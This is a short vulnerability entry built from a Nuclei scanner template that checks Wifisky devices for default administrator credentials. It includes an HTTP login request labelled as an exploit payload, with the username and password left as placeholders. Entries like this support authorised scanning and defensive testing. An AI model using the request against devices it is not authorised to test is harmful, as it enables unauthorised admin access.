# Nuclei Template: Wifisky Default Login
**Template ID:** wifisky-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`wifisky-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Wifisky default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login.php?action=login&type=admin HTTP/1.1
Host: {{Hostname}}
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close

username={{username}}&password={{password}}
```

## References
- https://securityforeveryone.com/tools/wifisky-default-password-scanner
